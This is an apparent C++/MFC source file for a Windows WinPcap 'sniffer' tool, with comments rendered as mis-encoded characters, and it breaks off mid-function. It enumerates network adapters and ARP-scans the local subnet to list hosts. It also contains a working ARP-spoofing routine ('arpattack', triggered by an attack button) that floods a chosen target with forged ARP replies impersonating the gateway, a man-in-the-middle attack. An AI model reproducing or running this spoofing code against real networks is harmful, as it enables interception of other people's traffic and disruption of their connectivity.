
// snifferDlg.cpp : ʵ���ļ�
//

#include "stdafx.h"
#include "sniffer.h"
#include "snifferDlg.h"
#include "afxdialogex.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#define _WINSOCK_DEPRECATED_NO_WARNINGS 
#endif

void convertStrToUnChar(char* str, unsigned char* UnChar)//ת�޷��ַ�
{
	int i = strlen(str), j = 0, counter = 0;
	char c[2];
	unsigned int bytes[2];

	for (j = 0; j < i; j += 2)
	{
		if (0 == j % 2)
		{
			c[0] = str[j];
			c[1] = str[j + 1];
			sscanf_s(c, "%02x", &bytes[0]);
			UnChar[counter] = bytes[0];
			counter++;
		}
	}
	return;
}

char* cs2ca(CString str)//CStringתchar
{
	char *ptr;
#ifdef _UNICODE  
	LONG len;
	len = WideCharToMultiByte(CP_ACP, 0, str, -1, NULL, 0, NULL, NULL);
	ptr = new char[len + 1];
	memset(ptr, 0, len + 1);
	WideCharToMultiByte(CP_ACP, 0, str, -1, ptr, len + 1, NULL, NULL);
#else  
	ptr = new char[str.GetAllocLength() + 1];
	sprintf(ptr, _T("%s"), str);
#endif  
	return ptr;
}

CString ANSIToUnicode(char * szChar)//charתCString
{
	int len = 0;
	len = MultiByteToWideChar(CP_ACP, 0, szChar, -1, NULL, 0);
	TCHAR * p;
	p = new TCHAR[len + 1];
	memset(p, 0, (len + 1) * sizeof(TCHAR));
	MultiByteToWideChar(CP_ACP, 0, szChar, -1, p, len);

	CString ss;
	ss.Format(_T("%s"), p);
	delete[]p;
	return ss;
}
void getgateway_mac(CString a,unsigned char *b)//��ȡ����mac
{
	ULONG mm = 6;
	IPAddr ip = inet_addr(cs2ca(a));
	SendARP(ip,0,b,&mm);
}
int CsnifferDlg::GetLocalDev()//iphelper��
{
	IP_ADAPTER_INFO *pAdapterInfo;//ָ��������Ϣ�ṹ������
	ULONG ulOutBuflen;//����������Ϣ��������
	DWORD dwRetval;//���ص��ñ���
	PIP_ADAPTER_INFO pAdapter;//��ѯ��������������ʱ�ĵ���
	CString mb;//�ݴ�
	pAdapterInfo = (IP_ADAPTER_INFO *)malloc(sizeof(IP_ADAPTER_INFO));
	ulOutBuflen = sizeof(IP_ADAPTER_INFO);//�����ռ�����pAdapterInfo = (IP_ADAPTER_INFO*)GlobalAlloc(GMEM_ZEROINIT, sizeof(IP_ADAPTER_INFO)); GlobalFree (pAdapterInfo);
	int is = 0;
	char *tempstr;
	if (GetAdaptersInfo(pAdapterInfo, &ulOutBuflen) != ERROR_SUCCESS)
	{
		free(pAdapterInfo);
		pAdapterInfo = (IP_ADAPTER_INFO *)malloc(ulOutBuflen);
		//��һ����ѯ��Ϣ������С��uloutbuflen
	}
	if ((dwRetval = GetAdaptersInfo(pAdapterInfo, &ulOutBuflen)) == NO_ERROR)
	{
		pAdapter = pAdapterInfo;
		//pAdapter->Description�а���"PCI"Ϊ����������pAdapter->Type��71Ϊ��������  
		while (pAdapter)
		{
			//pAdapter->Description�а���"PCI"Ϊ����������pAdapter->Type��71Ϊ��������  
			Dev[is] = ANSIToUnicode(pAdapter->AdapterName);
			Devdescription[is] = ANSIToUnicode(pAdapter->Description);
			Gateway[is] = ANSIToUnicode(pAdapter->GatewayList.IpAddress.String);
			tempstr = pAdapter->IpAddressList.IpAddress.String;
			IP[is] = ANSIToUnicode(tempstr);
			tempstr = pAdapter->IpAddressList.IpMask.String;
			subnet[is] = ANSIToUnicode(tempstr);
			for (int i = 0; i < pAdapter->AddressLength; i++)
			{
				mb.Format(_T("%2x"), pAdapter->Address[i]);
				localmac[is] += mb;
			}
			/*DWORD dwRetVal;
			IPAddr DestIp = 0;
			IPAddr SrcIp = 0;       /* default for src ip 
			ULONG MacAddr[2];       /* for 6-byte hardware addresses 
			ULONG PhysAddrLen = 6;  /* default to length of six bytes 
			BYTE *bPhysAddr;
			DestIp = inet_addr(pAdapterInfo->GatewayList.IpAddress.String);
			SrcIp = inet_addr(pAdapterInfo->IpAddressList.IpAddress.String);
			memset(&MacAddr, 0xff, sizeof(MacAddr));
			dwRetVal = SendARP(DestIp, SrcIp, &MacAddr, &PhysAddrLen);
			if (dwRetVal == NO_ERROR)
			{
				bPhysAddr = (BYTE *)& MacAddr;
				if (PhysAddrLen)
				{
					memcpy(localmac[i], bPhysAddr, PhysAddrLen);
				}
			}*/
			pAdapter = pAdapter->Next;
			is++;
		}
	}
	return 1;
}

/*int CsnifferDlg::GetLocalDev()       //wincap��
{
	//����Dev�б�����ֵ����ֹ�û���Խ��������Dev���鱣����Ϊ�����豸  
	for (int j = 0; j < 10; j++)
		Dev[j] = (CString)"";

	pcap_if_t *d;//����������
	int i = 0;
	char errbuf[PCAP_ERRBUF_SIZE];//���󻺳���
	if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL, &d, errbuf) == -1)//��ȡ�豸�б�(char��Դ, struct pcap_rmtauth , pcap_if_t, char )
	{
		return -1;                            
	}

	//����ȡ�����豸�б����Ʊ�����Dev������  
	for (; d != NULL; d = d->next)
	{
		Dev[i] = d->name;
		Devdescription[i] = d->description;
		sockaddr_in *temp=(sockaddr_in*)&d->addresses->addr;//ǿ��ת��Ϊsockaddr_in������
		
		char str[INET_ADDRSTRLEN];
		char* ptr =(char *) inet_ntop(AF_INET, &temp->sin_addr, str, sizeof(str));
		IP[i] = ANSIToUnicode(ptr);
		i++;
	}

	if (i == 0)
	{
		return 0;                           //�豸�б�Ϊ��  
	}

	pcap_freealldevs(d);              //�ͷ��豸�б�  

	return 1;                               //��ȡ�豸�б��ɹ�  
}
// ����Ӧ�ó��򡰹��ڡ��˵����� CAboutDlg �Ի���

int GetSelfMac(pcap_t *adhandle, const char *ip_addr, unsigned char *ip_mac)//��ȡ����mac
{
	arp_package myPackage;//arp���ݰ�
	unsigned char sendbuf[42]; //arp���ṹ��С
	struct pcap_pkthdr * pkt_header;
	const u_char * pkt_data;
	int res;
	memset(myPackage.eth.dest_mac, 0xff, 6); //Ŀ�ĵ�ַΪȫΪ�㲥��ַ  
	memset(myPackage.eth.source_mac, 0x0f, 6);
	memset(myPackage.arp.dest_addr, 0x0f, 6);
	memset(myPackage.arp.sour_addr, 0x00, 6);
	//htons��һ���޷��Ŷ����͵�������ֵת��Ϊ�����ֽ�˳��  
	myPackage.eth.eh_type = htons(ETH_ARP);
	myPackage.arp.hardware_type = htons(ARP_HARDWARE);
	myPackage.arp.protocol_type = htons(ETH_IP);
	myPackage.arp.add_len = 6;
	myPackage.arp.pro_len = 4;
	myPackage.arp.sour_ip = inet_addr("100.100.100.100"); //��������������ip  
	myPackage.arp.option = htons(ARP_REQUEST);
	myPackage.arp.dest_ip =inet_addr(ip_addr);
	memset(sendbuf, 0, sizeof(sendbuf));
	memcpy(sendbuf, &myPackage.eth, sizeof(myPackage.eth));
	memcpy(sendbuf + sizeof(myPackage.eth), &myPackage.arp, sizeof(myPackage.arp));
	if (pcap_sendpacket(adhandle, sendbuf, 42) != 0)
	{
		return -1;
	}
	while ((res = pcap_next_ex(adhandle, &pkt_header, &pkt_data)) >= 0) 
	{
		if (*(unsigned short *)(pkt_data + 12) == htons(ETH_ARP)
			&& *(unsigned short*)(pkt_data + 20) == htons(ARP_REPLY)
			&& *(unsigned long*)(pkt_data + 38)
			== inet_addr("100.100.100.100")) 
		{
			for (int i = 0; i < 6; i++) 
			{
				ip_mac[i] = *(unsigned char *)(pkt_data + 22 + i);
			}
			break;
		}
	}
	return 0;
}*/
class CAboutDlg : public CDialogEx
{
public:
	CAboutDlg();

// �Ի�������
	enum { IDD = IDD_ABOUTBOX };

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV ֧��

// ʵ��
protected:
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialogEx(CAboutDlg::IDD)
{
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)
END_MESSAGE_MAP()


// CsnifferDlg �Ի���



CsnifferDlg::CsnifferDlg(CWnd* pParent /*=NULL*/)
	: CDialogEx(CsnifferDlg::IDD, pParent)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CsnifferDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_TEXT, Device);
	DDX_Control(pDX, IDC_IPADDRESS2, m_netip);
	DDX_Control(pDX, IDC_LIST4, m_listview);
	DDX_Control(pDX, IDC_IPADDRESS3, m_subnetip);
	DDX_Control(pDX, IDC_IPADDRESS1, m_set);
	DDX_Control(pDX, IDC_BUTTON2, m_start);
	DDX_Control(pDX, IDC_BUTTON4, m_attack);
}

BEGIN_MESSAGE_MAP(CsnifferDlg, CDialogEx)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
ON_CBN_SELCHANGE(IDC_TEXT, &CsnifferDlg::OnCbnSelchangeText)
ON_BN_CLICKED(IDC_BUTTON2, &CsnifferDlg::OnBnClickedButton2)
//ON_BN_CLICKED(IDC_BUTTON3, &CsnifferDlg::OnBnClickedButton3)
ON_WM_CLOSE()
//ON_NOTIFY(NM_DBLCLK, IDC_LIST4, &CsnifferDlg::OnNMDblclkList4)
ON_NOTIFY(NM_CLICK, IDC_LIST4, &CsnifferDlg::OnNMClickList4)
ON_BN_CLICKED(IDC_BUTTON4, &CsnifferDlg::OnBnClickedButton4)
//ON_BN_CLICKED(IDC_BUTTON5, &CsnifferDlg::OnBnClickedButton5)
END_MESSAGE_MAP()


// CsnifferDlg ��Ϣ��������

BOOL CsnifferDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// ��������...���˵������ӵ�ϵͳ�˵��С�

	// IDM_ABOUTBOX ������ϵͳ���Χ�ڡ�
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		BOOL bNameValid;
		CString strAboutMenu;
		bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);
		ASSERT(bNameValid);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// ���ô˶Ի�����ͼ�ꡣ  ��Ӧ�ó��������ڲ��ǶԻ���ʱ�����ܽ��Զ�
	//  ִ�д˲���
	SetIcon(m_hIcon, TRUE);			// ���ô�ͼ��
	SetIcon(m_hIcon, FALSE);		// ����Сͼ��

	// TODO:  �ڴ����Ӷ����ĳ�ʼ������
	
		//exit(-1);
	
	//d = alldev->next;
	GetLocalDev();
	for (int i = 0; Devdescription[i] != _T(""); i++)
		Device.AddString(Devdescription[i]);//������������
	//Device.SetCurSel(0);//������ʼ��
	//m_netip.SetWindowTextW(IP[0]);//IP�ؼ���ʼ��
	//localIp = inet_addr(cs2ca(IP[0]));
	//m_subnetip.SetWindowTextW(subnet[0]);//������ʼ��
	//netMask = inet_addr(cs2ca(subnet[0]));
	
	DWORD dwStyle = GetWindowLong(m_listview.GetSafeHwnd(), GWL_STYLE);//ListView ��ʼ��
	dwStyle &= ~LVS_TYPEMASK;//������ʾ��ʽλ
	dwStyle |= LVS_REPORT; //����style
	SetWindowLong(m_listview.GetSafeHwnd(), GWL_STYLE, dwStyle);//��������
	//������
	m_listview.InsertColumn(0, _T("IP��ַ"), LVCFMT_LEFT, 100);
	m_listview.InsertColumn(0, _T("�û�\\����"), LVCFMT_LEFT, 150);
	//m_listview.InsertColumn(0, _T("����"), LVCFMT_LEFT, 150);
	//m_listview.InsertColumn(0, _T("������"), LVCFMT_LEFT, 150);
	m_listview.InsertColumn(0, _T("MAC��ַ"), LVCFMT_LEFT, 150);
	m_listview.SetExtendedStyle(LVS_EX_GRIDLINES);//��չ�����������ߣ�ֻ������report������listctrl��
	::SendMessage(m_listview.m_hWnd, LVM_SETEXTENDEDLISTVIEWSTYLE, LVS_EX_FULLROWSELECT, LVS_EX_FULLROWSELECT);//ѡ��һ�ж�����һ��
	m_attack.EnableWindow(FALSE);
	return TRUE;  // ���ǽ��������õ��ؼ������򷵻� TRUE
}

void CsnifferDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialogEx::OnSysCommand(nID, lParam);
	}
}

// �������Ի���������С����ť������Ҫ�����Ĵ���
//  �����Ƹ�ͼ�ꡣ  ����ʹ���ĵ�/��ͼģ�͵� MFC Ӧ�ó�����
//  �⽫�ɿ����Զ����ɡ�

void CsnifferDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // ���ڻ��Ƶ��豸������

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// ʹͼ���ڹ����������о���
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// ����ͼ��
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}

//���û��϶���С������ʱϵͳ���ô˺���ȡ�ù���
//��ʾ��
HCURSOR CsnifferDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}
UINT arpattack(LPVOID param)
{
	while (true)
	{
		arp_package myPackage,attachP;//arp���ݰ�
		CsnifferDlg *d = (CsnifferDlg*)param;
		//if (d->flag) return 0;
		/*unsigned char sendbuf_g[42]; //arp���ṹ��С
		memcpy(attachP.eth.dest_mac, d->gateway_mac, 6); //Ŀ�ĵ�ַ
		memcpy(attachP.eth.source_mac, d->sp.mac, 6);
		memcpy(attachP.arp.dest_addr, d->gateway_mac, 6);
		memcpy(attachP.arp.sour_addr, d->sp.mac, 6);
		//htons��һ���޷��Ŷ����͵�������ֵת��Ϊ�����ֽ�˳��  
		attachP.eth.eh_type = htons(ETH_ARP);
		attachP.arp.hardware_type = htons(ARP_HARDWARE);
		attachP.arp.protocol_type = htons(ETH_IP);
		attachP.arp.add_len = 6;
		attachP.arp.pro_len = 4;
		attachP.arp.option = htons(ARP_REPLY);*/

		unsigned char sendbuf[42]; //arp���ṹ��С
		memcpy(myPackage.eth.dest_mac, d->attach_mac, 6); //Ŀ�ĵ�ַ
		memcpy(myPackage.eth.source_mac, d->sp.mac, 6);
		memcpy(myPackage.arp.dest_addr, d->attach_mac, 6);
		memcpy(myPackage.arp.sour_addr, d->sp.mac, 6);
		//htons��һ���޷��Ŷ����͵�������ֵת��Ϊ�����ֽ�˳��  
		myPackage.eth.eh_type = htons(ETH_ARP);
		myPackage.arp.hardware_type = htons(ARP_HARDWARE);
		myPackage.arp.protocol_type = htons(ETH_IP);
		myPackage.arp.add_len = 6;
		myPackage.arp.pro_len = 4;
		myPackage.arp.sour_ip = inet_addr(cs2ca(d->Gateway[d->n])); //����ip  
		myPackage.arp.option = htons(ARP_REPLY);
		CString mm;
		d->m_set.GetWindowTextW(mm);
		myPackage.arp.dest_ip = inet_addr(cs2ca(mm));//��ƭ��ַattachP.arp.sour_ip =
		memset(sendbuf, 0, sizeof(sendbuf));//����Ŀ����ƭ
		memcpy(sendbuf, &myPackage.eth, sizeof(myPackage.eth));
		memcpy(sendbuf + sizeof(myPackage.eth), &myPackage.arp, sizeof(myPackage.arp));
		/*memset(sendbuf_g, 0, sizeof(sendbuf));//����������ƭ
		memcpy(sendbuf_g, &attachP.eth, sizeof(attachP.eth));
		memcpy(sendbuf_g + sizeof(attachP.eth), &attachP.arp, sizeof(attachP.arp));*/
		if (pcap_sendpacket(d->sp.adhandle, sendbuf, 42) != 0)
		{
			return -1;
		}
		/*if (pcap_sendpacket(d->sp.adhandle, sendbuf_g, 42) != 0)
		{
			return -1;
		}*/
		if (d->attack)  break;
	}
	return 0;
}
/*
unsigned short check_sum(unsigned short *packet, int packlen)//У����
{
	register unsigned long sum = 0;
	while (packlen > 1)
	{
		sum += *(packet++);
		packlen -= 2;
	}
	if (packlen > 0)
		sum += *(unsigned char *)packet;
	while (sum >> 16)
		sum = (sum & 0xffff) + (sum >> 16);


	return (unsigned short)(~sum);
}
UINT send_icmp_Thread(LPVOID param)//������raw��icmp���߳�
{
	icmp_package myPackage;//icmp���ݰ�
	unsigned char icmpPacket[512]; //icmp���ṹ��С
	CsnifferDlg *d = (CsnifferDlg*)param;
	if (d->flag) return 0;
	byte flagAndIndex[4];
	char data[] = "";
	*(unsigned short *)flagAndIndex = htons(0x01);
	*(unsigned short *)(flagAndIndex + 2) = htons(0x11);
	//USHORT seq;
	memset(myPackage.eth.dest_mac, 0xff, 6); //Ŀ�ĵ�ַΪȫΪ�㲥��ַ  
	memcpy(myPackage.eth.source_mac, d->sp.mac, 6);
	myPackage.eth.eh_type = htons(ETH_IP);
	memset(&myPackage.icmp, 0x00, sizeof(myPackage.icmp));
	myPackage.icmp.i_type = htons(ECHO);
	myPackage.icmp.i_code = 0x00;
	//myPackage.icmp.i_cksum = 0;
	//myPackage.icmp.timestamp = GetCurrentTime();
	//myPackage.icmp.i_id = GetCurrentThreadId();
	//myPackage.icmp.i_seq=seq++;
	//myPackage.icmp.i_cksum = check_sum((unsigned short *)(myPackage.icmp), sizeof(icmp_head));
	memset(icmpPacket, 0x00, sizeof(icmpPacket));
	memcpy(icmpPacket, &myPackage.icmp, sizeof(myPackage.icmp));
	memcpy(icmpPacket + sizeof(myPackage.icmp), flagAndIndex, sizeof(flagAndIndex));
	memcpy(icmpPacket + sizeof(myPackage.icmp) + sizeof(flagAndIndex), data, sizeof(data));
	int icmpSize = sizeof(icmp_head) + sizeof(flagAndIndex) + sizeof(data);
	*(unsigned short *)(((icmp_head *)icmpPacket)->checkSum) = check_sum((unsigned short *)icmpPacket, icmpSize);
	memset(&myPackage.iph, 0, sizeof(myPackage.iph));
	unsigned char versionAndLen = 0x04;
	versionAndLen <<= 4;
	versionAndLen |= sizeof(ip_head) / 4; //�汾 + ͷ����  
	myPackage.iph.h_lenver = versionAndLen;
	*(unsigned short *)myPackage.iph.total_len = htons(sizeof(ip_head) + icmpSize);
	myPackage.iph.ttl = 0xFF;
	myPackage.iph.proto = 0x01;
	*(unsigned short *)(myPackage.iph.checksum) = check_sum((unsigned short *)&myPackage.iph, sizeof(myPackage.iph));
	byte packet[1024];
	myPackage.iph.sourceIP = d->localIp;
	for (unsigned int i = d->ipBegin; i <= d->ipEnd; ++i)
	{
		myPackage.iph.destIP = htonl(i);
		memset(packet, 0x00, sizeof(packet));
		memcpy(packet, &myPackage.eth, sizeof(myPackage.eth));
		memcpy(packet + sizeof(myPackage.eth), &myPackage.iph, sizeof(myPackage.iph));
		memcpy(packet + sizeof(myPackage.eth) + sizeof(myPackage.iph), icmpPacket, icmpSize);//����
		int size = sizeof(myPackage.eth) + sizeof(myPackage.iph) + sizeof(myPackage.icmp) + sizeof(flagAndIndex) + sizeof(data);
		if (pcap_sendpacket(d->sp.adhandle, packet, size) != 0)
		{
			return -1;
		}
		Sleep(50);
	}
	Sleep(1000);// d->m_listview.InsertItem(0, _T("aa"));
	return 0;
}*/
UINT sendThread(LPVOID param)//������raw��arp���߳�
{
	
	arp_package myPackage;//arp���ݰ�
	CsnifferDlg *d = (CsnifferDlg*)param;
	
	unsigned char sendbuf[42]; //arp���ṹ��С
	memset(myPackage.eth.dest_mac, 0xff, 6); //Ŀ�ĵ�ַΪȫΪ�㲥��ַ  
	memcpy(myPackage.eth.source_mac, d->sp.mac, 6);
	memset(myPackage.arp.dest_addr, 0x0f, 6);
	memcpy(myPackage.arp.sour_addr, d->sp.mac, 6);
	//htons��һ���޷��Ŷ����͵�������ֵת��Ϊ�����ֽ�˳��  
	myPackage.eth.eh_type = htons(ETH_ARP);
	myPackage.arp.hardware_type = htons(ARP_HARDWARE);
	myPackage.arp.protocol_type = htons(ETH_IP);
	myPackage.arp.add_len = 6;
	myPackage.arp.pro_len = 4;
	myPackage.arp.sour_ip = d->localIp; //����ip  
	myPackage.arp.option = htons(ARP_REQUEST);
	for (unsigned int i = d->ipBegin; i <= d->ipEnd; ++i)
	{
		myPackage.arp.dest_ip = htonl(i);
		memset(sendbuf, 0, sizeof(sendbuf));
		memcpy(sendbuf, &myPackage.eth, sizeof(myPackage.eth));
		memcpy(sendbuf + sizeof(myPackage.eth), &myPackage.arp, sizeof(myPackage.arp));//����
		if (pcap_sendpacket(d->sp.adhandle, sendbuf, 42) != 0)
		{
			return -1;
		}
		if (d->flag) return 0;
		Sleep(50); //d->m_listview.InsertItem(0, _T("aa"));
	}
	Sleep(1000);
	return 0;
}
/*
UINT recv_icmp_Thread(LPVOID param)//�����߳�
{
	pcap_pkthdr* pktHd;//�����յ����İ�ͷ
	const unsigned char* pktDt;//�����յ�����������
	CsnifferDlg *d = (CsnifferDlg*)param;
	int res = 1, idex;
	//unsigned char mac[6];
	CString a;
	while (res >= 0)                                    //���ջظ���
	{
		if (d->flag) break;
		// d->m_listview.InsertItem(d->a_1, _T("aa"));
		if ((res = pcap_next_ex(d->gp.adhandle, &pktHd, &pktDt)) >= 0)
		{
			if (res == 0) continue;
			if (*(unsigned short *)(pktDt + 12) == htons(ETH_IP))
			{
				ip_head *ip_hdr = (ip_head *)(pktDt + 14);
				u_short ip_hdrLen = ip_hdr->h_lenver * 4;
				icmp_head *icmp_hdr = (icmp_head *)(pktDt + 14 + ip_hdrLen);
				if (icmp_hdr->i_type == htons(0))
				{
					//CString tempn;
					//CString tempm;
					//for (int i = 0; i < 6; i++)
					//{
					//	mac[i] = *(unsigned char *)(pktDt + 22 + i);
					//	tempm.Format(_T("%02x"), mac[i]);
					//	tempn += tempm;
					//}
					//if (a == tempn) continue;//�������ظ���
					//a = tempn;
					a.Format(_T("%d.%d.%d.%d"), ip_hdr->sourceIP & 255,
						ip_hdr->sourceIP >> 8 & 255,//��λ>>
						ip_hdr->sourceIP >> 16 & 255,
						ip_hdr->sourceIP >> 24 & 255);
					idex = d->m_listview.InsertItem(0, a);
					HOSTENT *lpHostEnt;
					lpHostEnt = gethostbyaddr(cs2ca(a), 4, AF_INET);
					if (!lpHostEnt)
					{
						//p->MessageBox(_T("zhujimingkong"));
						d->m_listview.SetItemText(idex, 1, _T("������"));
					}
					else
					{
						CString hstr = ANSIToUnicode((lpHostEnt->h_name));

						d->m_listview.SetItemText(idex, 1, hstr);
					}

				}
			}

		}
		idex++;
	}
	return 0;
}*/
UINT recvThread(LPVOID param)//�����߳�
{
	pcap_pkthdr* pktHd;//�����յ����İ�ͷ
	const unsigned char* pktDt;//�����յ�����������
	CsnifferDlg *d = (CsnifferDlg*)param;
	int res = 1,idex;
	unsigned char mac[6];
	CString a=_T("");
	//d->m_listview.InsertItem(0, _T("aa"));
	while (res>=0)                                    //���ջظ���
	{
		if (d->flag) break;
		// d->m_listview.InsertItem(d->a_1, _T("aa"));
		if ((res = pcap_next_ex(d->gp.adhandle, &pktHd, &pktDt)) >= 0)
		{
			if (res == 0) continue; //d->m_listview.InsertItem(0, _T("aa"));
			if (*(unsigned short *)(pktDt + 12) == htons(ETH_ARP))
			{
				arp_package* recv = (arp_package*)pktDt;
				if (*(unsigned short *)(pktDt + 20) == htons(ARP_REPLY))
				{
					CString tempn;
					CString tempm;
					for (int i = 0; i < 6; i++)
					{
						mac[i] = *(unsigned char *)(pktDt + 22 + i);
						tempm.Format(_T("%02x"), mac[i]);
						tempn += tempm;
					}
					if (a == tempn) continue;//�������ظ���
					a = tempn;
					idex=d->m_listview.InsertItem(0, tempn);
					tempn.Format(_T("%d.%d.%d.%d"), recv->arp.sour_ip & 255,
						recv->arp.sour_ip >> 8 & 255,
						recv->arp.sour_ip >> 16 & 255,
						recv->arp.sour_ip >> 24 & 255);
					d->m_listview.SetItemText(idex, 2, tempn);// d->m_listview.InsertItem(0, _T("aa"));
				}
			}
			
		}
		idex++;
	}
	return 0;
}
void CsnifferDlg::OnCbnSelchangeText()
{
	// TODO:  �ڴ����ӿؼ�֪ͨ������������
	//if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL, &alldev, errbuf) == -1)//��ȡ�����豸�б�(char��Դ, struct pcap_rmtauth , pcap_if_t, char )
	//{
	//	exit(-1);
	//}
	m_listview.DeleteAllItems();
	pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL, &alldev, errbuf);//��ȡ�����豸�б�(char��Դ, struct pcap_rmtauth , pcap_if_t, char )
	int i = 0;
	n = Device.GetCurSel();
	m_netip.SetWindowTextW(IP[n]);
	localIp = inet_addr(cs2ca(IP[n]));
	m_subnetip.SetWindowTextW(subnet[n]);
	netMask = inet_addr(cs2ca(subnet[n]));
	//��ת��ѡ�е�������  
	for (d = alldev,i=0; i< n-1; d = d->next, i++);
	if (strstr(cs2ca(subnet[n]), "0.0.0.0")) m_start.EnableWindow(FALSE);
	else m_start.EnableWindow(TRUE);
	getgateway_mac(Gateway[n],gateway_mac);
}


void CsnifferDlg::OnBnClickedButton2()
{
	// TODO:  �ڴ����ӿؼ�֪ͨ������������
	//m_netip.EnableWindow(FALSE);
	//m_subnetip.EnableWindow(FALSE);
	//Device.EnableWindow(FALSE);//�����ؼ����߳̽���ǰ���޷�����
	//pAdapter->Description�а���"PCI"Ϊ����������pAdapter->Type��71Ϊ��������  
	convertStrToUnChar(cs2ca(localmac[n]), ip_mac);
	
	ipBegin = ntohl(localIp &netMask);//���㱾���ε�һ̨������ip
	ipEnd = ipBegin + ~ntohl(netMask);//���㱾���ε�����һ��ip����������ȡ�Ǳ�ʾ�����ο��е�������
	if (!a)
	{
		Device.EnableWindow(FALSE);
		a = true;
		flag = false;//��ʼɨ��
		m_start.SetWindowTextW(_T("ֹͣɨ��"));
		/*if (strstr(cs2ca(Devdescription[Device.GetCurSel()]), "PCIe") <= 0)
		{
			//m_listview.InsertItem(0, _T("aa"));
			adhandle = pcap_open_live(d->name,          // �豸����
				1000,            // ȷ�����еİ���������·���϶��ܲ������ݰ�����
			    0,    // ��ʹ�û���ģʽ
				500,             // ��ʱ
				//NULL,             // Զ�̻�������֤                     ʵʱ����
				errbuf);
			sp.adhandle = adhandle;
			gp.adhandle = adhandle;
			sp.mac = ip_mac;
			AfxBeginThread(send_icmp_Thread, this, THREAD_PRIORITY_NORMAL, 0, 0, NULL);//�����������̣߳����ȼ�ΪNOMAL,��ǰ���Ի���thisʵ��send
			AfxBeginThread(recv_icmp_Thread, this, THREAD_PRIORITY_NORMAL, 0, 0, NULL);//�����������̣߳����ȼ�ΪNOMAL,��ǰ���Ի���thisʵ��send
		}
		else
		{*/
			if ((adhandle = pcap_open(d->name,          // �豸����
				65536,            // ȷ�����еİ���������·���϶��ܲ������ݰ�����
				PCAP_OPENFLAG_PROMISCUOUS,    // ����ģʽ
				1000,             // ��ʱ
				NULL,             // Զ�̻�������֤
				errbuf)) == NULL)
			{
				pcap_freealldevs(d);
				//exit(-1);
			}
			sp.adhandle = adhandle;
			sp.mac = ip_mac;
			gp.adhandle = adhandle; //m_listview.InsertItem(0, _T("aa"));
			AfxBeginThread(sendThread, this, THREAD_PRIORITY_NORMAL, 0, 0, NULL);//�����������̣߳����ȼ�ΪNOMAL,��ǰ���Ի���thisʵ��send
			AfxBeginThread(recvThread, this, THREAD_PRIORITY_NORMAL, 0, 0, NULL);//�����������̣߳����ȼ�ΪNOMAL,��ǰ���Ի���thisʵ��recv
			//m_netip.EnableWindow(TRUE);
			//m_listview.InsertItem(0, _T("aa"));
			m_attack.EnableWindow(TRUE);
		//���������豸
		//bpf_program* filterCode = NULL;//�������ݽṹ
		//char* filterString = "ether protoarp";//arpЭ��Ϊ��
		//if (-1 != pcap_compile(adhandle, filterCode, filterString, 1,netMask))  // ����������
		//{
		//	pcap_setfilter(adhandle, filterCode);//�󶨹�����
		//}
		//GetSelfMac(adhandle,cs2ca(IP[n]),ip_mac);
		//m_subnetip.EnableWindow(TRUE);
		////�����ؼ����߳̽���������
	}
	else{ m_start.SetWindowTextW(_T("��ʼɨ��")); a = false; flag = true; Device.EnableWindow(TRUE); }
}


//void CsnifferDlg::OnBnClickedButton3()
//{
//	// TODO:  �ڴ����ӿؼ�֪ͨ������������
//	//m_netip.EnableWindow(TRUE);
//	//m_subnetip.EnableWindow(TRUE);
//	//Device.EnableWindow(TRUE);//�����ؼ����߳̽���������
//	flag=true;//ǿ����ֹ���Ƽ���������dll�쳣���٣����̱���
//}


void CsnifferDlg::OnClose()
{
	// TODO:  �ڴ�������Ϣ��������������/������Ĭ��ֵ
	if (MessageBox(_T("ȷ���˳�����"), _T("��ʾ"), MB_YESNO | MB_ICONWARNING) == IDNO) return;
	CDialogEx::OnClose();
}


//void CsnifferDlg::OnNMDblclkList4(NMHDR *pNMHDR, LRESULT *pResult)
//{
//	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
//	// TODO:  �ڴ����ӿؼ�֪ͨ������������
//	 
//	*pResult = 0;
//}


void CsnifferDlg::OnNMClickList4(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
	// TODO:  �ڴ����ӿؼ�֪ͨ������������
	POSITION ps;
	int nIndex;
	ps = m_listview.GetFirstSelectedItemPosition();
	nIndex = m_listview.GetNextSelectedItem(ps);//��ȡλ��
	CString str;
